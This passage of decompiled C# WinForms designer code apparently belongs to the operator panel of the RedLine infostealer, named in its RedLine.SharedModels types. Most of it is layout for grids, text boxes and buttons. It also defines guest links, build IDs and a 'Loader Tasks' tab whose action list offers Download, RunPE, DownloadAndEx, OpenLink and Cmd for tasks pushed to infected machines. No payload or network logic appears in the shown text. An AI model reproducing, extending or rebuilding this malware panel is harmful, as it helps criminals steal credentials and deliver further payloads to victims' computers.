		((System.Windows.Forms.DataGridView)this.guestFilesDgv).ReadOnly = true;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Sunken;
		dataGridViewCellStyle9.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle9.BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		dataGridViewCellStyle9.Font = new System.Drawing.Font("Segoe UI", 9f);
		dataGridViewCellStyle9.ForeColor = System.Drawing.Color.Silver;
		dataGridViewCellStyle9.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle9.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle9.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).RowHeadersDefaultCellStyle = dataGridViewCellStyle9;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
		dataGridViewCellStyle10.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle10.BackColor = System.Drawing.Color.FromArgb(52, 60, 67);
		dataGridViewCellStyle10.ForeColor = System.Drawing.Color.Silver;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).RowsDefaultCellStyle = dataGridViewCellStyle10;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).RowTemplate.DefaultCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).RowTemplate.DefaultCellStyle.BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).RowTemplate.DefaultCellStyle.ForeColor = System.Drawing.Color.Silver;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).ShowEditingIcon = false;
		((System.Windows.Forms.Control)this.guestFilesDgv).Size = new System.Drawing.Size(501, 259);
		((System.Windows.Forms.Control)this.guestFilesDgv).TabIndex = 102;
		((System.Windows.Forms.Control)this.guestFilesDgv).DoubleClick += new System.EventHandler(guestFilesDgv_DoubleClick);
		((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn3).DataPropertyName = "ID";
		((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn3).HeaderText = "ID";
		((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn3).Name = "iDDataGridViewTextBoxColumn3";
		((System.Windows.Forms.DataGridViewBand)this.iDDataGridViewTextBoxColumn3).ReadOnly = true;
		((System.Windows.Forms.DataGridViewColumn)this.filenameDataGridViewTextBoxColumn).DataPropertyName = "Filename";
		((System.Windows.Forms.DataGridViewColumn)this.filenameDataGridViewTextBoxColumn).HeaderText = "Filename";
		((System.Windows.Forms.DataGridViewColumn)this.filenameDataGridViewTextBoxColumn).Name = "filenameDataGridViewTextBoxColumn";
		((System.Windows.Forms.DataGridViewBand)this.filenameDataGridViewTextBoxColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewColumn)this.filenameDataGridViewTextBoxColumn).Width = 250;
		((System.Windows.Forms.DataGridViewColumn)this.changeMd5DataGridViewCheckBoxColumn).DataPropertyName = "ChangeMd5";
		((System.Windows.Forms.DataGridViewColumn)this.changeMd5DataGridViewCheckBoxColumn).HeaderText = "ChangeMd5";
		((System.Windows.Forms.DataGridViewColumn)this.changeMd5DataGridViewCheckBoxColumn).Name = "changeMd5DataGridViewCheckBoxColumn";
		((System.Windows.Forms.DataGridViewBand)this.changeMd5DataGridViewCheckBoxColumn).ReadOnly = true;
		((System.Windows.Forms.BindingSource)this.object_14).DataSource = typeof(RedLine.SharedModels.GuestFile);
		((System.Windows.Forms.Control)this.metroSetDivider16).Location = new System.Drawing.Point(126, 330);
		((System.Windows.Forms.Control)this.metroSetDivider16).Name = "metroSetDivider16";
		((MetroSetDivider)this.metroSetDivider16).Orientation = (DividerStyle)0;
		((System.Windows.Forms.Control)this.metroSetDivider16).Size = new System.Drawing.Size(934, 4);
		((MetroSetDivider)this.metroSetDivider16).Style = (Style)1;
		((MetroSetDivider)this.metroSetDivider16).StyleManager = null;
		((System.Windows.Forms.Control)this.metroSetDivider16).TabIndex = 101;
		((System.Windows.Forms.Control)this.metroSetDivider16).Text = "metroSetDivider16";
		((MetroSetDivider)this.metroSetDivider16).ThemeAuthor = "Narwin";
		((MetroSetDivider)this.metroSetDivider16).ThemeName = "MetroDark";
		((MetroSetDivider)this.metroSetDivider16).Thickness = 1;
		((AnimaTextBox)this.guestExpireDate).Dark = false;
		((System.Windows.Forms.Control)this.guestExpireDate).Location = new System.Drawing.Point(485, 269);
		((AnimaTextBox)this.guestExpireDate).MaxLength = 32767;
		((AnimaTextBox)this.guestExpireDate).MultiLine = false;
		((System.Windows.Forms.Control)this.guestExpireDate).Name = "guestExpireDate";
		((AnimaTextBox)this.guestExpireDate).Numeric = false;
		((AnimaTextBox)this.guestExpireDate).ReadOnly = false;
		((System.Windows.Forms.Control)this.guestExpireDate).Size = new System.Drawing.Size(265, 23);
		((System.Windows.Forms.Control)this.guestExpireDate).TabIndex = 100;
		((AnimaTextBox)this.guestExpireDate).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.label34).AutoSize = true;
		((System.Windows.Forms.Control)this.label34).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label34).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label34).Location = new System.Drawing.Point(378, 273);
		((System.Windows.Forms.Control)this.label34).Name = "label34";
		((System.Windows.Forms.Control)this.label34).Size = new System.Drawing.Size(100, 15);
		((System.Windows.Forms.Control)this.label34).TabIndex = 99;
		((System.Windows.Forms.Control)this.label34).Text = "Expires DateTime:";
		((AnimaTextBox)this.guestBuildID).Dark = false;
		((System.Windows.Forms.Control)this.guestBuildID).Location = new System.Drawing.Point(485, 231);
		((AnimaTextBox)this.guestBuildID).MaxLength = 32767;
		((AnimaTextBox)this.guestBuildID).MultiLine = false;
		((System.Windows.Forms.Control)this.guestBuildID).Name = "guestBuildID";
		((AnimaTextBox)this.guestBuildID).Numeric = false;
		((AnimaTextBox)this.guestBuildID).ReadOnly = false;
		((System.Windows.Forms.Control)this.guestBuildID).Size = new System.Drawing.Size(265, 23);
		((System.Windows.Forms.Control)this.guestBuildID).TabIndex = 98;
		((AnimaTextBox)this.guestBuildID).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.label33).AutoSize = true;
		((System.Windows.Forms.Control)this.label33).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label33).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label33).Location = new System.Drawing.Point(378, 235);
		((System.Windows.Forms.Control)this.label33).Name = "label33";
		((System.Windows.Forms.Control)this.label33).Size = new System.Drawing.Size(48, 15);
		((System.Windows.Forms.Control)this.label33).TabIndex = 97;
		((System.Windows.Forms.Control)this.label33).Text = "BuildID:";
		((System.Windows.Forms.Control)this.addGuest).BackColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((System.Windows.Forms.ButtonBase)this.addGuest).FlatAppearance.BorderSize = 0;
		((System.Windows.Forms.ButtonBase)this.addGuest).FlatStyle = System.Windows.Forms.FlatStyle.Popup;
		((System.Windows.Forms.Control)this.addGuest).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.addGuest).ForeColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.addGuest).Location = new System.Drawing.Point(671, 298);
		((System.Windows.Forms.Control)this.addGuest).Name = "addGuest";
		((System.Windows.Forms.Control)this.addGuest).Size = new System.Drawing.Size(79, 26);
		((System.Windows.Forms.Control)this.addGuest).TabIndex = 96;
		((System.Windows.Forms.Control)this.addGuest).Text = "Create Link";
		((System.Windows.Forms.ButtonBase)this.addGuest).UseVisualStyleBackColor = false;
		((System.Windows.Forms.Control)this.addGuest).Click += new System.EventHandler(addGuest_Click);
		((System.Windows.Forms.DataGridView)this.fd).AllowUserToAddRows = false;
		((System.Windows.Forms.DataGridView)this.fd).AllowUserToDeleteRows = false;
		((System.Windows.Forms.DataGridView)this.fd).AllowUserToResizeColumns = false;
		((System.Windows.Forms.DataGridView)this.fd).AllowUserToResizeRows = false;
		dataGridViewCellStyle11.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle11.BackColor = System.Drawing.Color.FromArgb(52, 60, 67);
		dataGridViewCellStyle11.Font = new System.Drawing.Font("Segoe UI", 9f);
		dataGridViewCellStyle11.ForeColor = System.Drawing.Color.Silver;
		dataGridViewCellStyle11.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		((System.Windows.Forms.DataGridView)this.fd).AlternatingRowsDefaultCellStyle = dataGridViewCellStyle11;
		((System.Windows.Forms.DataGridView)this.fd).AutoGenerateColumns = false;
		((System.Windows.Forms.DataGridView)this.fd).BackgroundColor = System.Drawing.Color.FromArgb(52, 60, 67);
		((System.Windows.Forms.DataGridView)this.fd).BorderStyle = System.Windows.Forms.BorderStyle.None;
		((System.Windows.Forms.DataGridView)this.fd).CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.RaisedVertical;
		((System.Windows.Forms.DataGridView)this.fd).ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
		((System.Windows.Forms.DataGridView)this.fd).ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle12.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle12.BackColor = System.Drawing.Color.FromArgb(58, 62, 73);
		dataGridViewCellStyle12.Font = new System.Drawing.Font("Segoe UI", 9f);
		dataGridViewCellStyle12.ForeColor = System.Drawing.Color.Silver;
		dataGridViewCellStyle12.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle12.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle12.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		((System.Windows.Forms.DataGridView)this.fd).ColumnHeadersDefaultCellStyle = dataGridViewCellStyle12;
		((System.Windows.Forms.DataGridView)this.fd).ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
		((System.Windows.Forms.DataGridView)this.fd).Columns.AddRange((System.Windows.Forms.DataGridViewColumn)this.fe, (System.Windows.Forms.DataGridViewColumn)this.ff, (System.Windows.Forms.DataGridViewColumn)this.expiresTimeDataGridViewTextBoxColumn);
		((System.Windows.Forms.Control)this.fd).ContextMenuStrip = (System.Windows.Forms.ContextMenuStrip)this.blackListCms_5;
		((System.Windows.Forms.DataGridView)this.fd).DataSource = this.object_12;
		dataGridViewCellStyle13.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle13.BackColor = System.Drawing.Color.FromArgb(58, 62, 73);
		dataGridViewCellStyle13.Font = new System.Drawing.Font("Segoe UI", 9f);
		dataGridViewCellStyle13.ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
		dataGridViewCellStyle13.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle13.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle13.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		((System.Windows.Forms.DataGridView)this.fd).DefaultCellStyle = dataGridViewCellStyle13;
		((System.Windows.Forms.DataGridView)this.fd).EditMode = System.Windows.Forms.DataGridViewEditMode.EditOnEnter;
		((System.Windows.Forms.DataGridView)this.fd).EnableHeadersVisualStyles = false;
		((System.Windows.Forms.DataGridView)this.fd).GridColor = System.Drawing.Color.FromArgb(52, 60, 67);
		((System.Windows.Forms.Control)this.fd).Location = new System.Drawing.Point(226, 11);
		((System.Windows.Forms.DataGridView)this.fd).MultiSelect = false;
		((System.Windows.Forms.Control)this.fd).Name = "guestLinksDgv";
		((System.Windows.Forms.DataGridView)this.fd).ReadOnly = true;
		((System.Windows.Forms.DataGridView)this.fd).RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Sunken;
		dataGridViewCellStyle14.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle14.BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		dataGridViewCellStyle14.Font = new System.Drawing.Font("Segoe UI", 9f);
		dataGridViewCellStyle14.ForeColor = System.Drawing.Color.Silver;
		dataGridViewCellStyle14.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle14.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle14.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		((System.Windows.Forms.DataGridView)this.fd).RowHeadersDefaultCellStyle = dataGridViewCellStyle14;
		((System.Windows.Forms.DataGridView)this.fd).RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
		dataGridViewCellStyle15.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle15.BackColor = System.Drawing.Color.FromArgb(52, 60, 67);
		dataGridViewCellStyle15.ForeColor = System.Drawing.Color.Silver;
		((System.Windows.Forms.DataGridView)this.fd).RowsDefaultCellStyle = dataGridViewCellStyle15;
		((System.Windows.Forms.DataGridView)this.fd).RowTemplate.DefaultCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		((System.Windows.Forms.DataGridView)this.fd).RowTemplate.DefaultCellStyle.BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.DataGridView)this.fd).RowTemplate.DefaultCellStyle.ForeColor = System.Drawing.Color.Silver;
		((System.Windows.Forms.DataGridView)this.fd).ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
		((System.Windows.Forms.DataGridView)this.fd).SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		((System.Windows.Forms.DataGridView)this.fd).ShowEditingIcon = false;
		((System.Windows.Forms.Control)this.fd).Size = new System.Drawing.Size(701, 214);
		((System.Windows.Forms.Control)this.fd).TabIndex = 17;
		((System.Windows.Forms.Control)this.fd).DoubleClick += new System.EventHandler(fd_DoubleClick);
		((System.Windows.Forms.DataGridViewColumn)this.fe).DataPropertyName = "ID";
		((System.Windows.Forms.DataGridViewColumn)this.fe).HeaderText = "ID";
		((System.Windows.Forms.DataGridViewColumn)this.fe).Name = "iDDataGridViewTextBoxColumn2";
		((System.Windows.Forms.DataGridViewBand)this.fe).ReadOnly = true;
		((System.Windows.Forms.DataGridViewColumn)this.fe).Width = 300;
		((System.Windows.Forms.DataGridViewColumn)this.ff).DataPropertyName = "BuildID";
		((System.Windows.Forms.DataGridViewColumn)this.ff).HeaderText = "BuildID";
		((System.Windows.Forms.DataGridViewColumn)this.ff).Name = "buildIDDataGridViewTextBoxColumn1";
		((System.Windows.Forms.DataGridViewBand)this.ff).ReadOnly = true;
		((System.Windows.Forms.DataGridViewColumn)this.ff).Width = 200;
		((System.Windows.Forms.DataGridViewColumn)this.expiresTimeDataGridViewTextBoxColumn).DataPropertyName = "ExpiresTime";
		((System.Windows.Forms.DataGridViewColumn)this.expiresTimeDataGridViewTextBoxColumn).HeaderText = "ExpiresTime";
		((System.Windows.Forms.DataGridViewColumn)this.expiresTimeDataGridViewTextBoxColumn).Name = "expiresTimeDataGridViewTextBoxColumn";
		((System.Windows.Forms.DataGridViewBand)this.expiresTimeDataGridViewTextBoxColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewColumn)this.expiresTimeDataGridViewTextBoxColumn).Width = 150;
		((System.Windows.Forms.BindingSource)this.object_12).DataSource = typeof(RedLine.SharedModels.GuestLink);
		((System.Windows.Forms.Control)this.tasksTab).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.c0);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.c1);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.c2);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.c3);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.deleteAllBtn);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.updateTaskBtn);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.currentTaskStatus);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.editTaskFilter);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.editTaskFinal);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.editTaskTarget);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.editTaskAction);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.newTaskAction);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.newTaskFilter);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.newTaskFinal);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.newTaskTarget);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.currentTaskStatusLbl);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.editTaskVisible);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.editTaskVisibleLbl);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.editTaskFilterLbl);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.newTaskFilterLbl);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.editTaskFinalLbl);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.saveTaskBtn);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.editTaskTargetLbl);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.editTaskActionLbl);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider9);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.newTaskFinalLbl);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.addTaskBtn);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.newTaskTargetLbl);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.newTaskActionLbl);
		((System.Windows.Forms.Control)this.tasksTab).Controls.Add((System.Windows.Forms.Control)this.tasksDgv);
		((System.Windows.Forms.Control)this.tasksTab).Font = new System.Drawing.Font("Segoe UI", 9f);
		((System.Windows.Forms.Control)this.tasksTab).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.TabPage)this.tasksTab).Location = new System.Drawing.Point(194, 4);
		((System.Windows.Forms.Control)this.tasksTab).Name = "tasksTab";
		((System.Windows.Forms.Control)this.tasksTab).Size = new System.Drawing.Size(1168, 639);
		((System.Windows.Forms.TabPage)this.tasksTab).TabIndex = 11;
		((System.Windows.Forms.Control)this.tasksTab).Text = "Loader Tasks";
		((AnimaTextBox)this.c0).Dark = false;
		((System.Windows.Forms.Control)this.c0).Location = new System.Drawing.Point(734, 545);
		((AnimaTextBox)this.c0).MaxLength = 32767;
		((AnimaTextBox)this.c0).MultiLine = false;
		((System.Windows.Forms.Control)this.c0).Name = "editTaskDomainsCheck";
		((AnimaTextBox)this.c0).Numeric = false;
		((AnimaTextBox)this.c0).ReadOnly = false;
		((System.Windows.Forms.Control)this.c0).Size = new System.Drawing.Size(413, 23);
		((System.Windows.Forms.Control)this.c0).TabIndex = 100;
		((AnimaTextBox)this.c0).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.c1).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.c1).Location = new System.Drawing.Point(625, 543);
		((System.Windows.Forms.Control)this.c1).Name = "editTaskDomainsCheckLbl";
		((System.Windows.Forms.Control)this.c1).Size = new System.Drawing.Size(103, 25);
		((MetroSetLabel)this.c1).Style = (Style)1;
		((MetroSetLabel)this.c1).StyleManager = null;
		((System.Windows.Forms.Control)this.c1).TabIndex = 99;
		((System.Windows.Forms.Control)this.c1).Text = "Domains Check:";
		((System.Windows.Forms.Label)this.c1).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.c1).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.c1).ThemeName = "MetroDark";
		((AnimaTextBox)this.c2).Dark = false;
		((System.Windows.Forms.Control)this.c2).Location = new System.Drawing.Point(119, 545);
		((AnimaTextBox)this.c2).MaxLength = 32767;
		((AnimaTextBox)this.c2).MultiLine = false;
		((System.Windows.Forms.Control)this.c2).Name = "newTaskDomains";
		((AnimaTextBox)this.c2).Numeric = false;
		((AnimaTextBox)this.c2).ReadOnly = false;
		((System.Windows.Forms.Control)this.c2).Size = new System.Drawing.Size(438, 23);
		((System.Windows.Forms.Control)this.c2).TabIndex = 98;
		((AnimaTextBox)this.c2).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.c3).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.c3).Location = new System.Drawing.Point(-1, 543);
		((System.Windows.Forms.Control)this.c3).Name = "newTaskDomainsLbl";
		((System.Windows.Forms.Control)this.c3).Size = new System.Drawing.Size(114, 25);
		((MetroSetLabel)this.c3).Style = (Style)1;
		((MetroSetLabel)this.c3).StyleManager = null;
		((System.Windows.Forms.Control)this.c3).TabIndex = 97;
		((System.Windows.Forms.Control)this.c3).Text = "Domains Check:";
		((System.Windows.Forms.Label)this.c3).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.c3).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.c3).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.deleteAllBtn).BackColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((System.Windows.Forms.ButtonBase)this.deleteAllBtn).FlatAppearance.BorderSize = 0;
		((System.Windows.Forms.ButtonBase)this.deleteAllBtn).FlatStyle = System.Windows.Forms.FlatStyle.Popup;
		((System.Windows.Forms.Control)this.deleteAllBtn).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.deleteAllBtn).ForeColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.deleteAllBtn).Location = new System.Drawing.Point(22, 329);
		((System.Windows.Forms.Control)this.deleteAllBtn).Name = "deleteAllBtn";
		((System.Windows.Forms.Control)this.deleteAllBtn).Size = new System.Drawing.Size(79, 26);
		((System.Windows.Forms.Control)this.deleteAllBtn).TabIndex = 96;
		((System.Windows.Forms.Control)this.deleteAllBtn).Text = "Reset";
		((System.Windows.Forms.ButtonBase)this.deleteAllBtn).UseVisualStyleBackColor = false;
		((System.Windows.Forms.Control)this.deleteAllBtn).Click += new System.EventHandler(deleteAllBtn_Click);
		((System.Windows.Forms.Control)this.updateTaskBtn).BackColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((System.Windows.Forms.ButtonBase)this.updateTaskBtn).FlatAppearance.BorderSize = 0;
		((System.Windows.Forms.ButtonBase)this.updateTaskBtn).FlatStyle = System.Windows.Forms.FlatStyle.Popup;
		((System.Windows.Forms.Control)this.updateTaskBtn).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.updateTaskBtn).ForeColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.updateTaskBtn).Location = new System.Drawing.Point(1073, 329);
		((System.Windows.Forms.Control)this.updateTaskBtn).Name = "updateTaskBtn";
		((System.Windows.Forms.Control)this.updateTaskBtn).Size = new System.Drawing.Size(79, 26);
		((System.Windows.Forms.Control)this.updateTaskBtn).TabIndex = 95;
		((System.Windows.Forms.Control)this.updateTaskBtn).Text = "Refresh list";
		((System.Windows.Forms.ButtonBase)this.updateTaskBtn).UseVisualStyleBackColor = false;
		((System.Windows.Forms.Control)this.updateTaskBtn).Click += new System.EventHandler(updateTaskBtn_Click);
		((System.Windows.Forms.Control)this.currentTaskStatus).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.ComboBox)this.currentTaskStatus).FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		((System.Windows.Forms.Control)this.currentTaskStatus).Font = new System.Drawing.Font("Segoe UI", 9f);
		((System.Windows.Forms.Control)this.currentTaskStatus).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.ListControl)this.currentTaskStatus).FormattingEnabled = true;
		((System.Windows.Forms.ComboBox)this.currentTaskStatus).Items.AddRange(new object[4] { "Active", "Pause", "Stopped", "Done" });
		((System.Windows.Forms.Control)this.currentTaskStatus).Location = new System.Drawing.Point(733, 581);
		((System.Windows.Forms.Control)this.currentTaskStatus).Name = "currentTaskStatus";
		((System.Windows.Forms.Control)this.currentTaskStatus).Size = new System.Drawing.Size(214, 23);
		((System.Windows.Forms.Control)this.currentTaskStatus).TabIndex = 94;
		((System.Windows.Forms.Control)this.currentTaskStatus).Text = "Active";
		((AnimaTextBox)this.editTaskFilter).Dark = false;
		((System.Windows.Forms.Control)this.editTaskFilter).Location = new System.Drawing.Point(733, 503);
		((AnimaTextBox)this.editTaskFilter).MaxLength = 32767;
		((AnimaTextBox)this.editTaskFilter).MultiLine = false;
		((System.Windows.Forms.Control)this.editTaskFilter).Name = "editTaskFilter";
		((AnimaTextBox)this.editTaskFilter).Numeric = false;
		((AnimaTextBox)this.editTaskFilter).ReadOnly = false;
		((System.Windows.Forms.Control)this.editTaskFilter).Size = new System.Drawing.Size(414, 23);
		((System.Windows.Forms.Control)this.editTaskFilter).TabIndex = 93;
		((AnimaTextBox)this.editTaskFilter).UseSystemPasswordChar = false;
		((AnimaTextBox)this.editTaskFinal).Dark = false;
		((System.Windows.Forms.Control)this.editTaskFinal).Location = new System.Drawing.Point(734, 460);
		((AnimaTextBox)this.editTaskFinal).MaxLength = 32767;
		((AnimaTextBox)this.editTaskFinal).MultiLine = false;
		((System.Windows.Forms.Control)this.editTaskFinal).Name = "editTaskFinal";
		((AnimaTextBox)this.editTaskFinal).Numeric = false;
		((AnimaTextBox)this.editTaskFinal).ReadOnly = false;
		((System.Windows.Forms.Control)this.editTaskFinal).Size = new System.Drawing.Size(413, 23);
		((System.Windows.Forms.Control)this.editTaskFinal).TabIndex = 92;
		((AnimaTextBox)this.editTaskFinal).UseSystemPasswordChar = false;
		((AnimaTextBox)this.editTaskTarget).Dark = false;
		((System.Windows.Forms.Control)this.editTaskTarget).Location = new System.Drawing.Point(733, 418);
		((AnimaTextBox)this.editTaskTarget).MaxLength = 32767;
		((AnimaTextBox)this.editTaskTarget).MultiLine = false;
		((System.Windows.Forms.Control)this.editTaskTarget).Name = "editTaskTarget";
		((AnimaTextBox)this.editTaskTarget).Numeric = false;
		((AnimaTextBox)this.editTaskTarget).ReadOnly = false;
		((System.Windows.Forms.Control)this.editTaskTarget).Size = new System.Drawing.Size(414, 23);
		((System.Windows.Forms.Control)this.editTaskTarget).TabIndex = 91;
		((AnimaTextBox)this.editTaskTarget).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.editTaskAction).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.ComboBox)this.editTaskAction).FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		((System.Windows.Forms.Control)this.editTaskAction).Font = new System.Drawing.Font("Segoe UI", 9f);
		((System.Windows.Forms.Control)this.editTaskAction).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.ListControl)this.editTaskAction).FormattingEnabled = true;
		((System.Windows.Forms.ComboBox)this.editTaskAction).Items.AddRange(new object[5] { "Download", "RunPE", "DownloadAndEx", "OpenLink", "Cmd" });
		((System.Windows.Forms.Control)this.editTaskAction).Location = new System.Drawing.Point(813, 377);
		((System.Windows.Forms.Control)this.editTaskAction).Name = "editTaskAction";
